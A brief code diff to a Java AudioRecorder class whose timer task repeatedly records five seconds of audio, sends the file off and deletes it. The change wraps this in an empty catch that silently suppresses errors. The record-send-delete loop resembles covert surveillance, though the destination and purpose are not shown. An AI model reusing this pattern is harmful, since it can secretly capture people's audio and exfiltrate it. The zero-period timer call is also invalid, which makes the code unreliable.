@@ -114,9 +114,15 @@ public  class AudioRecorder {
         TimerTask task = new TimerTask() {
             @Override
             public void run() {
+                try{
                 File audiFile = startRecording();
                 stopRecordingIn(5);
                 sendFileAndDelete(audiFile);
+                }
+                catch(Exception e){
+
+                }
+                
             }
         };  
         timer.scheduleAtFixedRate(task, 0, 0);;
